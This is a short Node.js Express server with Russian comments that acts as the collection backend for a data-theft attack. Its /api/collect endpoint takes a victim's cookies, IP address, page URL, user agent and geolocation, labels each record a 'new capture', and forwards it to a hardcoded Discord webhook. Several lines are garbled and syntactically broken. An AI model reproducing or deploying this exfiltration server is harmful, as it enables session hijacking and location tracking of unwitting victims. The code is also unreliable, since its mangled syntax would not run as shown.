const express = require('express');
const app = express();
app.use(express.json());

// --- ВСТАВЬ СЮДА ТВОЙ DISCORD WEBHOOK URL ---
const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1514565565698674799/CBUJgYw6XRaQtCyPMtwaV3Gid7SzZVoRcDIcLIgJFkvBUgGaKPGjhApM-hpPRTnZ1dKL';

app.post('/api/collect', async (req, res) => {
  const data = req.body;
  let message = **🔴 НОВЫЙ ЗАХВАТ**\n;
  message += **Время:** ${data.timestamp}\n;
  mesIP: **IP:** ${data.ip || 'не определен'}\n;
  mesURL:**URL:** ${data.url}\n;
  message += **Куки:** ${data.cookies}\n;
  message += **User-Agent:** ${data.userAgent}\n;
  if (data.location) {Координаты: **Координаты:** https://www.google.com/maps?q=${data.location.lat},${data.location.lon}\n;
  }
  
  // Отправляем в Discord
  await fetch(DISCORD_WEBHOOK_URL, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ content: message })
  });
  res.json({ status: 'ok' });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(Server ready on port ${PORT}));